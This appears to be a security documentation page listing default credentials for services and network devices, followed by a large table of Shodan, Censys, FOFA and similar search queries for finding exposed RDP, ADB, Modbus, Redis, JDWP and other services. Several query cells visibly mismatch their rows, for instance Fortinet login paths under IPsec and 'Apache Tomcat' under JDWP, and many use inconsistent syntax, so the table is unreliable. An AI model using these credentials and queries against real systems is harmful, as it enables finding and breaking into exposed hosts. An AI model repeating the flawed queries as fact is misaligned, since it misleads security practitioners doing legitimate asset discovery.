---
title: Tips and Tricks
sidebar: mydoc_sidebar
permalink: tips_and_tricks.html
folder: mydoc
---


# Tips and tricks

## Default Credential

| S/P | username | password
| :--- | :--- | :--- |
| Jenkins | admin | admin |
| AWS EC2 | ec2-user | N/A (use SSH key) |
| AWS RDS | N/A (use IAM credentials) | N/A (use IAM credentials) |
| AWS S3  | N/A (use IAM credentials) | N/A (use IAM credentials) |
| Azure VM | azureuser | N/A (use SSH key) |
| Azure SQL Database | N/A (use Azure AD authentication or SQL Server authentication) | N/A (use Azure AD authentication or SQL Server authentication) |
| Google Compute Engine | N/A (use project-level SSH key) | N/A (use project-level SSH key) |
| Google Cloud SQL  | N/A (use Cloud SQL Proxy or SSL/TLS certificate)  | N/A (use Cloud SQL Proxy or SSL/TLS certificate) |
| Docker  | root | N/A  |
| Kubernetes | N/A  | N/A (use Kubernetes authentication mechanisms) |
| OpenStack | ubuntu | ubuntu |
| VMware ESXi | root | N/A |
| Cisco IOS | cisco | cisco |
| Juniper Junos | root | juniper123 |


more: https://github.com/ihebski/DefaultCreds-cheat-sheet


## Dork


|                              | shodan                                                                                                                                                                                                                                       | censys                                                                                                                                                                                                             | securitytrails                                                                                   | greynoise                                                                                                                                                      | binaryedge                                                                                           | zoomeye                                                                       | Netlas                                                                        | fofa                                                                                                                                                                   | huntr                                                                              | leakix                                                                                                                                                               |
|------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|-------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Nginx                | "nginx" http.component:nginx                                                                                              | "nginx" AND tags:web AND tags:https                                                                                                                                                                       | http.html_body.server:nginx                                                                           | service.name:nginx                                                        | http.servers:nginx                                                       | app:"nginx"                                                      | http.server:nginx                                                                                                                      | title="nginx" \|\| header="nginx"                                                                                                                                                                                          | http.servers="nginx"                                              | server:nginx                                                               |
| Apache               | "apache" http.component:apache                                                                                            | "apache" AND tags:web AND tags:https                                                                                                                                                                      | http.html_body.server:apache                                                                          | service.name:apache                                                       | http.servers:apache                                                      | app:"apache"                                                     | http.server:apache                                                                                                                     | title="apache" \|\| header="apache"                                                                                                                                                                                        | http.servers="apache"                                             | server:apache                                                              |
| Phpmyadmin           | Server: phpmyadmin                                                                                                        |                                                                                                                                                                                                           |                                                                                                       |                                                                           |                                                                          |                                                                  |                                                                                                                                        |                                                                                                                                                                                                                            |                                                                   |                                                                            |
| org asn              | asn:ASXXXXXXX org: <organization name>                                                                                    | asn:ASXXXXXXX AND tags:  <organization name>                                                                                                                                                              | include:asn:ASXXXXXXX AND type:organization                                                           | asn:ASXXXXXXX organization: <organization name>                           | asn:ASXXXXXXX organization: <organization name>                          | asn:ASXXXXXXX org: <organization name>                           | asn:ASXXXXXXX org: <organization name>                                                                                                 | header="ASXXXXXXX" && title=" <organization name> "                                                                                                                                                                        | asn:ASXXXXXXX organization: <organization name>                   | asn:ASXXXXXXX org: <organization name>                                     |
| elasticsearch        | product:elasticsearch                                                                                                     | elasticsearch.protocol:tcp                                                                                                                                                                                | os:elasticsearch                                                                                      | port:9200                                                                 | elasticsearch                                                            | app:"Elasticsearch" port:"9200"                                  | product:"Elasticsearch"                                                                                                                | title="Elasticsearch" \|\| body="Elasticsearch" \|\| header="Elasticsearch"                                                                                                                                                | product:"elasticsearch"                                           | title:"kibana" && title:"elastic"                                          |
| Minio                | http.html:" <title> Minio </title> "                                                                                      | (443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names: minio.*)                                                                                                                         | ssl.cert_subject_alt_name: minio                                                                      | metadata.product: "MinIO"                                                 | "http.component:Minio" OR "http.title:Minio"                             | title:Minio                                                      | http.title:"Minio"                                                                                                                     | title="MinIO" \|\| header="Minio" \|\| header="X-Amz-Bucket-Region"                                                                                                                                                        | intitle:"MinIO"                                                   | intitle:"MinIO"                                                            |
| kuberneties          | "kubernetes port:6443"                                                                                                    | "443.https.get.body: "kubernetes""                                                                                                                                                                        | "kubernetes.*.cloudapp.azure.com"                                                                     | "tags:kubernetes"                                                         | "title:"kubernetes-dashboard""                                           | "app:"kubernetes-dashboard""                                     | "app:"kubernetes-dashboard""                                                                                                           | "title="Kubernetes Dashboard" \|\| header="kubernetes""                                                                                                                                                                    | "title:"kubernetes dashboard""                                    | "title:"Kubernetes Dashboard""                                             |
| mssql                | product:"Microsoft SQL Server"                                                                                            | 443.https.get.body:"microsoft sql server" OR 1433.banner:"microsoft sql server"                                                                                                                           | http.html_content:"Microsoft SQL Server" OR http.html_content:"MSSQLSERVER"                           | tags:"mssql" OR tags:"microsoft sql server"                               | product:"Microsoft SQL Server"                                           | app:"Microsoft SQL Server"                                       | title:"Microsoft SQL Server" OR body:"Microsoft SQL Server" OR body:"MSSQLSERVER"                                                      | title="Microsoft SQL Server" \|\| header="Microsoft SQL Server"                                                                                                                                                            | title:"Microsoft SQL Server" OR body:"Microsoft SQL Server"       | server:Microsoft-IIS/8.5 intitle:"sql server login"                        |
| rdp                  | "rdp" OR "port:3389"                                                                                                      | 3389.rdp.banner:"\x03\x00\x00\x0b\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"                                                                | "rdp" AND port:3389                                                                                   | "tags.rdp" OR "tags.mstsc"                                                | "rdp" AND port:3389                                                      | "rdp" OR "port:3389"                                             | "rdp" OR "port:3389"                                                                                                                   | "protocol=rdp" OR "port=3389"                                                                                                                                                                                              | "rdp" OR "port:3389"                                              | "rdp" OR "port:3389"                                                       |
| ftp                  | "ftp"                                                                                                                     | "service.ftp.banner"                                                                                                                                                                                      | "service:ftp"                                                                                         | "protocol:ftp"                                                            | "ftp"                                                                    | "ftp"                                                            | "ftp"                                                                                                                                  | "protocol==ftp"                                                                                                                                                                                                            | "ftp"                                                             | "ftp"                                                                      |
| ssh                  | port:22 ssh                                                                                                               | 22.ssh.banner.raw_version: SSH                                                                                                                                                                            | 22 \|\| ssh                                                                                           | /ssh/ && port:22                                                          | ssh port:22                                                              | port:22 ssh                                                      | port:22 AND service.ssh==true                                                                                                          | protocol=ssh                                                                                                                                                                                                               | 22.ssh.banner.raw_version:SSH                                     | service.ssh == true                                                        |
| dns                  | hostname:{DNS name}                                                                                                       | parsed.names: {DNS name}                                                                                                                                                                                  | domain:{DNS name}                                                                                     | metadata.dns: {DNS name}                                                  | dns.name:{DNS name}                                                      | site:{DNS name}                                                  | dns.host: {DNS name}                                                                                                                   | domain={DNS name}                                                                                                                                                                                                          | domain:{DNS name}                                                 | data.hostnames: {DNS name}                                                 |
| modbus               | port:502 modbus                                                                                                           | modbus                                                                                                                                                                                                    | port:502                                                                                              | modbus                                                                    | port:502                                                                 | port:502 modbus                                                  | port:502 modbus                                                                                                                        | protocol=modbus                                                                                                                                                                                                            | port:502                                                          | port:502 modbus                                                            |
| rtsp                 | port:554 rtsp                                                                                                             | protocols: rtsp                                                                                                                                                                                           | port:554                                                                                              | protocols:rtsp                                                            | port:554 rtsp                                                            | port:554 rtsp                                                    | protocol:rtsp                                                                                                                          | protocol=rtsp                                                                                                                                                                                                              | protocol:rtsp                                                     | port:554                                                                   |
| SMTP                 | smtp                                                                                                                      | protocols:smtp                                                                                                                                                                                            | smtp                                                                                                  | port:25                                                                   | port:25                                                                  | service:smtp                                                     | service:smtp                                                                                                                           | protocol==smtp                                                                                                                                                                                                             | smtp                                                              | port.tcp eq 25                                                             |
| SMB                  | smb                                                                                                                       | protocols.smb.banner.signatures.name: "SMB"                                                                                                                                                               | tags.smb = true                                                                                       | metadata.protocol = smb                                                   | protocols:"smb"                                                          | app:"SMB/CIFS"                                                   | service:"smb"                                                                                                                          | protocol="smb"                                                                                                                                                                                                             | tags:"smb"                                                        | protocol:smb                                                               |
| NFS                  | port:2049 nfs                                                                                                             | protocols:"nfs"                                                                                                                                                                                           | port:2049 AND service:nfs                                                                             | tag:nfs                                                                   | port:2049 nfs                                                            | app:"nfsd"                                                       | nfs                                                                                                                                    | title="NFS" \|\| body="NFS" \|\| header="NFS" \|\| keyword="NFS"                                                                                                                                                           | port:2049 AND service:nfs                                         | port:2049 nfs                                                              |
| Docker registries    | http.title:"Docker Registry"" OR "http.html:"Docker Registry"" OR "http.component:"docker"" OR "http.component:"registry" | 443.https.get.metadata.protocol: Docker                                                                                                                                                                   | http.headers.server: docker-registry" OR "http.html: docker-registry" OR "http.title: docker-registry | http.metadata.product: Docker Registry                                    | http.component:docker-registry                                           | title:"Docker Registry"" OR "body:"Docker Registry"              | product:"Docker Registry"                                                                                                              | title="Docker Registry"" OR "header="docker-registry"" OR "body="docker-registry"                                                                                                                                          | docker-registry                                                   | http.component:"docker-registry"                                           |
| memcached            | port:11211 memcached                                                                                                      | protocols: "memcached"                                                                                                                                                                                    | type:server "memcached" port:11211                                                                    | service:memcached                                                         | port:11211 && memcached                                                  | port:"11211" memcached                                           | port:11211 && memcached                                                                                                                | title="Memcached" && protocol="port:11211"                                                                                                                                                                                 | port: 11211 AND tags: memcached                                   | protocols:"memcached" port:"11211"                                         |
| RabbitMQ             | product:rabbitmq                                                                                                          | 443.https.get.body:/{"product":"RabbitMQ","version":"                                                                                                                                                     | http.html: /management/rabbitmq/                                                                      | port:5672 (RabbitMQ) AND tags:RabbitMQ                                    | title:"RabbitMQ Management"                                              | app:"RabbitMQ Management"                                        | port:5672 AND product:rabbitmq                                                                                                         | title="RabbitMQ Management" \|\| body="RabbitMQ" \|\| header="RabbitMQ"                                                                                                                                                    | port:5672 AND service.name:rabbitmq                               | product:rabbitmq                                                           |
| WinRM                | product:winrm                                                                                                             | protocols:winrm                                                                                                                                                                                           | os:windows winrm                                                                                      | winrm                                                                     | winrm                                                                    | port:5985 winrm                                                  | service:WinRM                                                                                                                          | protocol==winrm                                                                                                                                                                                                            | winrm                                                             | winrm                                                                      |
| CouchDB              | couchdb port:5984                                                                                                         | protocols: "couchdb" and port: 5984                                                                                                                                                                       | http.component: "couchdb" and port: 5984                                                              | http.server: "CouchDB" and port: 5984                                     | protocols:couchdb and port:5984                                          | app:"CouchDB" and port:5984                                      | port:5984 and app:couchdb                                                                                                              | title="couchdb" && port=5984                                                                                                                                                                                               | couchdb inurl:5984                                                | app:couchdb && port:5984                                                   |
| PostgreSQL           | port:5432 postgres                                                                                                        | 443.versions.protocol: "PostgreSQL" or 5432.versions.protocol: "PostgreSQL"                                                                                                                               | pgsql-server                                                                                          | port:5432                                                                 | service:"postgresql"                                                     | port:"5432"                                                      | title:"pgAdmin" OR title:"PostgreSQL" OR title:"pgAdmin 4" OR title:"pgAdmin 3"                                                        | title="Adminer" \|\| body="pgsql" \|\| body="PostgreSQL"                                                                                                                                                                   | title:"postgresql" OR body:"postgresql"                           | pgsql-server                                                               |
| Gitlab               | http.favicon.hash:-335242539 "gitlab"                                                                                     | 443.https.get.metadata.server: GitLab                                                                                                                                                                     | http.headers.server:"gitlab"                                                                          | metadata.service:gitlab                                                   | title:"GitLab" && protocols:"https"                                      | title:"GitLab"                                                   | http.favicon.hash:-335242539 "gitlab"                                                                                                  | title="GitLab"                                                                                                                                                                                                             | title="GitLab"                                                    | title="GitLab"                                                             |
| SVN                  | Server: Apache SVN                                                                                                        | tags: svn                                                                                                                                                                                                 | svn                                                                                                   | /svn/index.cgi                                                            | title:"viewvc" svn                                                       | port: 3690 svn                                                   | os:svn                                                                                                                                 | title="ViewVC" \|\| title="SVN repository browser" \|\| title="VisualSVN Server" \|\| body="Powered by Subversion version"                                                                                                 | svn                                                               | svn                                                                        |
| Tomcat               | tomcat country:XX                                                                                                         | protocols: "http" and "product:Apache Tomcat"                                                                                                                                                             | http.web_server.name:"Apache Tomcat"                                                                  | metadata.product:tomcat                                                   | http.server.product:"Apache Tomcat"                                      | app:"Tomcat"                                                     | product:Tomcat                                                                                                                         | title="Apache Tomcat" \|\| body="Apache Tomcat"                                                                                                                                                                            | http.favicon.hash: -1448465410 && http.html: "Apache Tomcat"      | os.query:"Apache Tomcat"                                                   |
| VNC                  | "vnc" port:5900                                                                                                           | port: "5900" AND "VNC protocol"                                                                                                                                                                           | "vnc" AND port:5900                                                                                   | "vnc" -port:5900                                                          | protocol:"vnc" AND port:5900                                             | port:5900 AND app:"RealVNC"                                      | service:"vnc" port:"5900"                                                                                                              | port="5900" && protocol="vnc"                                                                                                                                                                                              | vnc AND port:5900                                                 | "vnc" port:5900                                                            |
| LDAP                 | "ldap" port:389 or port:636                                                                                               | tags: ldap                                                                                                                                                                                                | service:ldap                                                                                          | tag:ldap                                                                  | service:"LDAP (389/tcp)" or service:"LDAP SSL (636/tcp)"                 | app:"openLDAP" or app:"ActiveDirectory"                          | service.ldap.banner:"ldap"                                                                                                             | protocol==LDAP                                                                                                                                                                                                             | service:ldap                                                      | port:389 or port:636                                                       |
| NetBIOS              | port:"137" org:"<organization>"  or  netbios_name:"<name>"                                                                | protocols: "netbios-ssn"  or  netbios.name: "<name>"                                                                                                                                                      | netbios_host:<hostname>  or  netbios_host:<ip_address>                                                | netbios                                                                   | netbios.domain: "<domain_name>"  or  netbios.host:<ip_address>           | netbios.name:<name>  or  netbios.ip:<ip_address>                 | netbios.host:<ip_address>                                                                                                              | protocol="NetBIOS" && cert=""                                                                                                                                                                                              | netbios                                                           | netbios                                                                    |
| TeamViewer           | product:teamviewer                                                                                                        | 443.versions.banner:TeamViewer                                                                                                                                                                            | os:'Windows 7' && port:5938 && app:'TeamViewer'                                                       | metadata.teamviewer.enabled:true                                          | product:'TeamViewer' && type:'host'                                      | app:teamviewer                                                   | teamviewer                                                                                                                             | title="TeamViewer" \|\| header="TeamViewer"                                                                                                                                                                                | service:"TeamViewer"                                              | port.tcp eq 5938 and port.tcp eq 443 and product eq 'TeamViewer'           |
| NoMachine            | "nomachine" port:4000, "nomachine" port:4010, "nomachine" port:4011, "nomachine" port:4022                                | "nomachine" and port:4000 or port:4010 or port:4011 or port:4022                                                                                                                                          | service:"nomachine" and (port:4000 or port:4010 or port:4011 or port:4022)                            | "nomachine" port:4000 or port:4010 or port:4011 or port:4022              | service:nomachine and (port:4000 or port:4010 or port:4011 or port:4022) | app:"NoMachine" port:4000 or port:4010 or port:4011 or port:4022 | service:"nomachine" and (port:"4000" or port:"4010" or port:"4011" or port:"4022")                                                     | title="NoMachine" && (port=4000 \|\| port=4010 \|\| port=4011 \|\| port=4022)                                                                                                                                              | nomachine AND (port:4000 OR port:4010 OR port:4011 OR port:4022)  | tags.nomachine AND (ports:4000 OR ports:4010 OR ports:4011 OR ports:4022)  |
| vCenter              | "vCenter" port:443                                                                                                        | 443.https.get.metadata.product:VMware-vCenter-Server                                                                                                                                                      | http.title:"vCenter Server"                                                                           | tags:"vmware-vcenter"                                                     | title:"vSphere Client"                                                   | app:"VMware vSphere"                                             | http.html_contains:"vmware-vsphere-client"                                                                                             | title="VMware vCenter Server" \|\| body="vCenter Server" \|\| header="vCenter Server"                                                                                                                                      | service.name:VMware-vSphere                                       | product:"VMware vCenter Server"                                            |
| ESXi                 | product:ESXi                                                                                                              | os: vmware_esxi                                                                                                                                                                                           | os:'VMware ESXi'                                                                                      | tag:VMware-ESXi                                                           | os:'VMware ESXi'                                                         | webapp:VMware ESXi                                               | os:VMware ESXi                                                                                                                         | title='VMware ESXi'                                                                                                                                                                                                        | service.name:VMware ESXi                                          | product:'VMware ESXi'                                                      |
| directory listings   | "Server: -frontier -akamai -edgecast -fastly -incapsula -nginx -squarespace -cdn -amazonaws -cloudfront -gstatic -github" | "protocols: http and 200.status_code:/2[0-9][0-9]/ and body: "Index of /" and not (body: "HTTP/1.1 301" or body: "HTTP/1.1 302" or body: "HTTP/1.1 303" or body: "HTTP/1.1 307" or body: "HTTP/1.1 308")" | http.title:/index of/i                                                                                | metadata.product:apache && metadata.title:/index of/i                     | http.html.body:/Index of/i && http.status.code:200                       | web.title:/index of/i                                            | http.title:/index of/i                                                                                                                 | title="Index of /" && protocol="http" && status_code="200"                                                                                                                                                                 | http.body:/index of/i && http.status_code:200                     | title:"Index of /" && protocol:http                                        |
| SOCKS                | "socks" port:1080                                                                                                         | "socks" AND port:1080                                                                                                                                                                                     | port:1080 AND protocol:socks5                                                                         | "socks" AND port:1080                                                     | "SOCKS5" AND port:1080                                                   | "SOCKS5" && port:"1080"                                          | "SOCKS" port:"1080"                                                                                                                    | "SOCKS5" && port="1080"                                                                                                                                                                                                    | "SOCKS5" port:1080                                                | protocol:SOCKS5 port:1080                                                  |
| V2Ray                | v2ray                                                                                                                     | tags.v2ray                                                                                                                                                                                                | v2ray                                                                                                 | v2ray                                                                     | v2ray                                                                    | v2ray                                                            | v2ray                                                                                                                                  | protocol=="v2ray"                                                                                                                                                                                                          | v2ray                                                             | v2ray                                                                      |
| Squid                | http.component: squid                                                                                                     | 80.http.get.headers.server: squid                                                                                                                                                                         | HTTP.headers.server: squid                                                                            | http.server_header: squid                                                 | http.component: squid                                                    | app:Squid                                                        | http.component.product: squid                                                                                                          | title="Squid Cache" && protocol="http" && port=3128                                                                                                                                                                        | Squid proxy server" OR "Squid proxy cache                         | intext:"Squid Object Cache"                                                |
| PRTG                 | product:prtg port:80" or "product:prtg port:443                                                                           | 443.https.get.body: 'PRTG Network Monitor'" or "80.http.get.body: 'PRTG Network Monitor'                                                                                                                  | text:'PRTG Network Monitor' AND port:80" or "text:'PRTG Network Monitor' AND port:443                 | http.user_agent: 'PRTG' OR http.title: 'PRTG'                             | product:PRTG" or "body:PRTG Network Monitor                              | app:PRTG Network Monitor" or "header.server:PRTG Network Monitor | "prtg" or "prtg network monitor"                                                                                                       | "title="prtg" \|\| body="prtg"" or "protocol="http" && body="prtg""                                                                                                                                                        | "prtg" or "prtg network monitor"                                  | "product:PRTG" or "PRTG Network Monitor"                                   |
| WebDAV               | Server: Microsoft-IIS/7.5 intitle: "WebDAV" OR "WebDAV MiniRedir"                                                         | 80.http.get.headers.server: Microsoft-IIS/7.5 && title:"WebDAV MiniRedir"                                                                                                                                 | http.headers.server:/Microsoft-IIS/7.5/ && title:"WebDAV MiniRedir"                                   | 80.http.get.headers.server: Microsoft-IIS/7.5 && title:"WebDAV MiniRedir" | http.server: Microsoft-IIS/7.5 && html.title: "WebDAV MiniRedir"         | server:Microsoft-IIS/7.5 && title:"WebDAV MiniRedir"             | http.server: Microsoft-IIS/7.5 && http.title: "WebDAV MiniRedir"                                                                       | "title="WebDAV" && header="Microsoft-IIS/7.5"                                                                                                                                                                              | http.title:"WebDAV" && http.headers.server:"Microsoft-IIS/7.5"    | http.title: "WebDAV" && http.headers.server: "Microsoft-IIS/7.5"           |
| IIS                  | "Server: Microsoft-IIS" OR "Server: Microsoft-HTTPAPI"                                                                    | "443.https.get.title: IIS" OR "80.http.get.title: IIS"                                                                                                                                                    | "http.headers.server: Microsoft-IIS" OR "http.headers.server: Microsoft-HTTPAPI"                      | "http.server: Microsoft-IIS" OR "http.server: Microsoft-HTTPAPI"          | "server: Microsoft-IIS" OR "server: Microsoft-HTTPAPI"                   | "webapp="IIS"" OR "webserver="IIS""                              | "http.favicon.hash:-1137975641 AND http.server:"Microsoft-IIS"" OR "http.favicon.hash:-1137975641 AND http.server:"Microsoft-HTTPAPI"" | "protocol==http && header=="Server: Microsoft-IIS"" OR "protocol==http && header=="Server: Microsoft-HTTPAPI""                                                                                                             | "iis" OR "microsoft-iis"                                          | "http.server.name: Microsoft-IIS" OR "http.server.name: Microsoft-HTTPAPI" |
| Redis                | port:6379 product:redis                                                                                                   | ports: "6379" AND tags.raw: "redis"                                                                                                                                                                       | ("redis" AND port:6379)                                                                               | redis.server                                                              | protocols:"redis" -os:"Windows"                                          | redis port:6379                                                  | service:redis port:6379                                                                                                                | title="Redis" && protocol="redis"                                                                                                                                                                                          | port:"6379" AND protocol:"redis"                                  | port:6379 AND Redis                                                        |
| Cisco Smart Install  | Server: Cisco-SMI                                                                                                         | 443.issmartinstall:true                                                                                                                                                                                   | fingerprint: "Device Type: Cisco Smart Install Client"                                                | /cgi-bin/discovery/                                                       | title:Cisco Smart Install - Configuration Assistant                      | product:Cisco Smart Install                                      | title:Cisco Smart Install                                                                                                              | header='X-Remote-Addr' && title='Cisco Smart Install'                                                                                                                                                                      | http.favicon.hash:-1300641209 && http.title:'Cisco Smart Install' | product:Cisco Smart Install                                                |
| InfluxDB             | "InfluxDB" port:8086                                                                                                      | (open_influxdb.port: 8086)                                                                                                                                                                                | http.title:"InfluxDB Admin"                                                                           | "influxdb" -service.version:1.8                                           | http.component:influxdb                                                  | title:"InfluxDB" port:8086                                       | port:8086 service:InfluxDB                                                                                                             | title="InfluxDB" \|\| body="InfluxDB"                                                                                                                                                                                      | type:service InfluxDB                                             | server:"InfluxDB"                                                          |
| Cassandra            | "cassandra" port:9042                                                                                                     | "cassandra" AND port:9042                                                                                                                                                                                 | port:9042 AND "cassandra"                                                                             | "cassandra" AND tags:{"cassandra"}                                        | "cassandra" AND port:"9042"                                              | "cassandra" port:"9042"                                          | "cassandra" port:9042                                                                                                                  | title="cassandra" && port=9042                                                                                                                                                                                             | "cassandra" AND port:"9042"                                       | "cassandra" AND port:"9042"                                                |
| GlusterFS            | "GlusterFS"                                                                                                               | 443.versions = "GlusterFS"                                                                                                                                                                                | GlusterFS                                                                                             | http.favicon.hash:-434599080 "gluster"                                    | service.glusterfs.banner: "GlusterFS"                                    | app:"GlusterFS"                                                  | http.favicon.hash:-434599080 "gluster"                                                                                                 | title="Gluster Management Console" \|\| body="GlusterFS" \|\| header="Gluster"                                                                                                                                             | title:"GlusterFS Management Console"                              | service:/glusterfs/                                                        |
| Hadoop               | "hadoop" port:"50070" or "hadoop" port:"8088"                                                                             | product:Hadoop                                                                                                                                                                                            | "os:Linux" "hadoop"                                                                                   | "50070" \|\| "8088" && "hadoop"                                           | "hadoop" in_service:"50070, 8088"                                        | "hadoop" port:"50070" or "hadoop" port:"8088"                    | service.name:hadoop                                                                                                                    | title="Hadoop NameNode"" or "title="Hadoop Resource Manager"                                                                                                                                                               | title:"hadoop cluster overview"                                   | hadoop                                                                     |
| Fortigate            | http.favicon.hash:728337045 && title:"Fortinet - Login"                                                                   | 443.https.get.title:"Fortinet"                                                                                                                                                                            | http.html:"Fortinet"                                                                                  | port:443 http.html:"FortiGate"                                            | title:"Fortinet FortiGate"                                               | title:"Fortinet FortiGate Login"                                 | http.title:"FortiGate"                                                                                                                 | title="Fortinet FortiGate Login" \|\| header="Fortinet" \|\| body="Fortinet"                                                                                                                                               | fortigate                                                         |                                                                            |
| JDWP                 | jdwp country:"<country>" port:"8000"                                                                                      | 443.jdwp                                                                                                                                                                                                  | ("java.debugwire")                                                                                    | jdwp                                                                      | jdwp                                                                     | app:"JDWP-Debug-Interface"                                       | port=8000 protocol=TCP service=JDWP                                                                                                    | title="Apache Tomcat"                                                                                                                                                                                                      | jdwp                                                              |                                                                            |
| IPsec                | "ikev2.probe(500)" or "ikev2.probe(4500)" or "ipsec.probe()"                                                              | "protocols: 'ikev2' or protocols: 'ipsec'"                                                                                                                                                                | "ikev2" or "ipsec"                                                                                    | "port:500 or port:4500 or port: 1701 and tags:ipsec"                      | "protocols:ikev2 or protocols:ipsec"                                     | "ipsec" or "ikev2"                                               | "ikev2" or "ipsec"                                                                                                                     | "title="Fortinet Firewall Login" && body="/remote/login" && body="/tmui/login.jsp/" && body="/remote/login?lang=en" && body="/remote/login?lang=en_US" && body="/remote/login?lang=es" && body="/remote/login?lang=es_US"" | "service.name:"IPSec"" or "service.name:"IKEv2""                  | "protocol:ipsec" or "protocol:ikev2"                                       |
| Splunkd              | product:splunkd                                                                                                           | 443.https.get.metadata.product: Splunkd                                                                                                                                                                   | http.html: /en-US/splunkd/                                                                            | metadata.splunkd.server != null                                           | product: Splunkd                                                         | app:Splunk                                                       | Splunkd                                                                                                                                | title="Splunk" && header="Splunkd"                                                                                                                                                                                         | title:splunkd                                                     | splunkd                                                                    |
| Android Debug Bridge | "Android Debug Bridge" port:5555                                                                                          | 80.http.get.headers.server:"Android Debug Bridge"                                                                                                                                                         | server:adb                                                                                            | metadata.service == "adb"                                                 | service:"android debug bridge (adb)"                                     | app:"Android Debug Bridge"                                       | http.component:"Android Debug Bridge"                                                                                                  | app="Android Debug Bridge" \|\| header="Android Debug Bridge"                                                                                                                                                              | http.headers.server:"Android Debug Bridge"                        | http.server.version:"Android Debug Bridge"                                 |                                                                                                                          |                                                                                                                                                                                                           |                                                                                                       |                                                                           |                                                                          |                                                                  |                                                                                                                                        |                                                                                                                                                                                                                            |                                                                   |                                                                            |
| OpenCTI                      | http.favicon.hash:-1693683099                                                                                                                                                                                                                | 443.https.tls.certificate.parsed.extensions.authority_key_id:0a11b3211d2e25545ed61a568a78545c                                                                                                                      | app=nginx port:443                                                                               | 80.http.get.body.sha256:8f2c29dbae3b1cbbe10d59d8ed144c5999329fa974aa06f529ee550dc6341e2c                                                                       | http.component:nginx                                                                                 | title:'OpenCTI'                                                               | ssl://title:OpenCTI                                                           | title="OpenCTI" \|\| header="X-Opencti-Path" \|\| header="X-Opencti-User"                                                                                              | Server: nginx intitle:"OpenCTI"                                                    | title:"OpenCTI"                                                                                                                                                      |
| Wazuh                        | wazuh auth_token" or "title:Wazuh                                                                                                                                                                                                            | 443.https.get.body_sha256:XV8WbTtTSPBOnQ2R26dA9XFeOXXz0vVdNllZlf0u0LQ                                                                                                                                              | generic.server:Wazuh                                                                             | metadata.product:wazuh                                                                                                                                         | wazuh                                                                                                | title:Wazuh                                                                   | Wazuh                                                                         | app="Wazuh"                                                                                                                                                            | wazuh                                                                              | app:wazuh                                                                                                                                                            |
| Vault                        | "Vault Server" port:8200                                                                                                                                                                                                                     | 443.https.tls.certificate.parsed.extensions.subject_alt_name: .vault                                                                                                                                               | ssl.cert_subject_alt_name: .vault                                                                | http.html_hash:3896359815                                                                                                                                      | html:" <title> Vault </title> "                                                                      | title:"Vault"                                                                 | title:"Vault"                                                                 | title="Vault" && port=8200                                                                                                                                             | title:"Vault"                                                                      | "vault" port:8200                                                                                                                                                    |
| Rocket.Chat                  | product:"Rocket.Chat"                                                                                                                                                                                                                        | 443.https.get.metadata.software:Rocket.Chat                                                                                                                                                                        | http.html_body:"Rocket.Chat"                                                                     | http.user_agent:"Rocket.Chat"                                                                                                                                  | http.favicon.hash:-1788329738                                                                        | title:"Rocket.Chat"                                                           | title:"Rocket.Chat"                                                           | title="Rocket.Chat"                                                                                                                                                    | title:"Rocket.Chat"                                                                | http.title:"Rocket.Chat"                                                                                                                                             |
| Mattermost                   | http.favicon.hash:1565243809                                                                                                                                                                                                                 | 443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:mattermost.*                                                                                                                                | https.cert.subject.common_name:mattermost.*                                                      | metadata.product: mattermost                                                                                                                                   | protocols:https && service.metas.product:mattermost                                                  | app:"Mattermost"                                                              | http.url.path:/api/v4/users                                                   | title="Mattermost" \|\| header="mattermost"                                                                                                                            | body:"content":"Mattermost"                                                        | https://leakix.net/search?query=mattermost                                                                                                                           |
| Gitter                       | title:"gitter" http.component:"gitter"                                                                                                                                                                                                       | 443.https.tls.certificate.parsed.names: "gitter.im"                                                                                                                                                                | "gitter.im"                                                                                      | http.user_agent:"Mozilla/5.0 (compatible; Gitter)" or http.user_agent:"com.gitter"                                                                             | http.component:Gitter or ssl.cert.issuer.cn:gitter                                                   | title:"Gitter" or header:"X-Powered-By: Gitter"                               | host:gitter.im                                                                | title="Gitter" \|\| domain="gitter.im"                                                                                                                                 | title:"Gitter"                                                                     | domain:gitter.im                                                                                                                                                     |
| Confluence                   | title:"Dashboard - Confluence" http.favicon.hash:-335242539 "X-ASEN" -gitlab                                                                                                                                                                 | 443.https.tls.certificate.parsed.subject.common_name:"*.atlassian.net" and 443.https.tls.certificate.parsed.subject.organization:Atlassian                                                                         | http.html: /loginpage.action/i and http.html: /forgotlogin/                                      | http.server:Apache-Coyote/1.1 http.title:Confluence                                                                                                            | title:"Dashboard - Confluence" and protocols:https                                                   | app:"Confluence-Atlassian"                                                    | http.favicon.hash:-335242539 title:"Dashboard - Confluence"                   | title="Dashboard - Confluence"                                                                                                                                         | title:"Log in - Confluence"                                                        | title:"Log in - Confluence"                                                                                                                                          |
| Jira                         | "Jira" port: 80, 443, 8080, 8443                                                                                                                                                                                                             | "Jira" AND protocols: ("80/http" OR "443/https" OR "8080/http-proxy" OR "8443/https-alt")                                                                                                                          | "jira" OR "atlassian" OR "jira.example.com" OR "atlassian.example.com"                           | metadata.product:jira                                                                                                                                          | title:"JIRA - Login" OR body:"powered by Atlassian JIRA"                                             | app:"Jira"                                                                    | "jira" AND protocols: ("http" OR "https")                                     | title="Jira - Login" \|\| header="atlassian" \|\| domain="atlassian.net" \|\| domain="atlassian.com"                                                                   | "jira" OR "atlassian"                                                              | product:"jira" OR app:"jira"                                                                                                                                         |
| Element Matrix               | product:"Element Matrix Server"                                                                                                                                                                                                              | 443.https.get.title:"Element Matrix Services"                                                                                                                                                                      | http.html_title:"Element Matrix Services"                                                        | http.html_title:"Element Matrix Services"                                                                                                                      | title:"Element Matrix Services"                                                                      | app:"Element Matrix Services"                                                 | app:"Element Matrix Services"                                                 | title="Element Matrix Services"                                                                                                                                        | title:"Element Matrix Services"                                                    | title:"Element Matrix Services"                                                                                                                                      |
